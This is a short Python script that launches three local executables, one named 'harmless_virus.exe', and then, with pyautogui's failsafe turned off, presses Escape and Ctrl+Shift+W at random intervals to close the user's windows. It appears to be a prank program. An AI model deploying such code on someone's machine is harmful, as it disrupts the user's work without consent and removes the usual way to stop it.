import pyautogui as gui
import time as t
import subprocess as sp
import random

gui.FAILSAFE = False
SWidth, SHeight = gui.size()

path1 = r"D:/volumecontrol.exe"
path2 = r"D:/harmless_virus.exe"
path3 = r"D:/UmDraw.exe"

sp.run([path1])
sp.run([path2])
sp.run([path3])

timer = 0

while True:
    t.sleep(1)
    timer += 1
    if timer >= random.randint(180, 300):
        gui.press("esc")
        gui.keyDown("ctrl")
        gui.keyDown("shift")
        gui.press("w")
        gui.keyUp("shift")
        gui.keyUp("ctrl")
        timer = 0